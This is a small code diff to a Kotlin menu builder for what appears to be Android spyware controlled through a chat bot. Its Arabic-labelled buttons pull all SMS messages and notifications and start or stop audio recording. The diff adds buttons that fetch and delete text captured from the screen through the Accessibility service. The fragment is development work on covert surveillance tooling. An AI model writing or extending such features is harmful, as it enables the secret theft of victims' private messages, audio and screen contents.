@@ -18,6 +18,8 @@ object KeyboardBuilder {
         ))
         rows.put(row(btn("📩 كل الرسائل SMS", "sms_all")))
         rows.put(row(btn("🔔 كل الإشعارات", "notifs_all")))
+        rows.put(row(btn("📝 نصوص الشاشة (Accessibility)", "accessibility_log")))
+        rows.put(row(btn("🗑 حذف نصوص Accessibility", "accessibility_clear")))
         rows.put(row(
             btn("🎤 بدء التسجيل", "audio_start"),
             btn("⏹ إيقاف التسجيل", "audio_stop")
